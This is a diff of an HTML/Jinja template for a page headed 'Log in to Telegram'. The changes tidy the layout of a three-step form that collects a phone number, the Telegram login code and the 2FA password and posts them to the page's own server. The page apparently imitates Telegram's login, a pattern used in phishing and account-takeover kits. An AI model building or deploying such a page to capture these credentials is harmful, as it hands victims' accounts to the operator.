@@ -6,22 +6,22 @@
     <link rel="stylesheet" href="/static/style.css">
 </head>
 <body>
-    <div class="container">
+<div class="container">
     <div class="logo"></div>
     <h1>Войти в Telegram</h1>
-    <p style="font-size: small; margin-top: 10px;">Проверьте код страны и введите номер телефона</p>
 
-    <!-- Выбор языка -->
-    <form method="GET" id="language-form" style="margin-bottom: 20px;">
-        <label for="language-select">Выберите язык:</label>
-        <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
-            <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
-            <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
-            <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
-            <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
-            <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
-            <!-- Добавляй другие языки по желанию -->
-        </select>
+    <!-- Блок выбора языка -->
+    <form method="GET" id="language-form">
+        <div class="language-container">
+            <label for="language-select">Выберите язык:</label>
+            <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
+                <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
+                <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
+                <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
+                <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
+                <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
+            </select>
+        </div>
     </form>
 
     {% if error %}
@@ -31,32 +31,32 @@
     {% endif %}
 
     {% if stage == "phone" %}
+    <p class="hint-text">Проверьте код страны и введите номер телефона</p>
     <form method="POST">
         <input type="hidden" name="lang" value="{{ lang }}">
         <input type="text" name="phone" placeholder="Введите номер телефона" required>
-        <label><input type="checkbox" name="remember_me"> Запомнить меня</label>
+        <label class="remember-me">
+            <input type="checkbox" name="remember_me"> Запомнить меня
+        </label>
         <button type="submit">Далее</button>
     </form>
 
+    {% elif stage == "code" %}
+    <form method="POST" action="/code">
+        <input type="hidden" name="phone" value="{{ phone }}">
+        <input type="hidden" name="lang" value="{{ lang }}">
+        <input type="text" name="code" placeholder="Введите код из Telegram" required>
+        <button type="submit">Подтвердить</button>
+    </form>
 
-        <p style="font-size: small; margin-top: 10px;">Проверьте код страны и введите номер телефона</p>
-
-        {% elif stage == "code" %}
-        <form method="POST" action="/code">
-            <input type="hidden" name="phone" value="{{ phone }}">
-            <input type="hidden" name="lang" value="{{ lang }}">
-            <input type="text" name="code" placeholder="Введите код из Telegram" required>
-            <button type="submit">Подтвердить</button>
-        </form>
-
-        {% elif stage == "2fa" %}
-        <form method="POST" action="/password">
-            <input type="hidden" name="phone" value="{{ phone }}">
-            <input type="hidden" name="lang" value="{{ lang }}">
-            <input type="password" name="password" placeholder="Введите пароль 2FA" required>
-            <button type="submit">Войти</button>
-        </form>
-        {% endif %}
-    </div>
+    {% elif stage == "2fa" %}
+    <form method="POST" action="/password">
+        <input type="hidden" name="phone" value="{{ phone }}">
+        <input type="hidden" name="lang" value="{{ lang }}">
+        <input type="password" name="password" placeholder="Введите пароль 2FA" required>
+        <button type="submit">Войти</button>
+    </form>
+    {% endif %}
+</div>
 </body>
 </html>
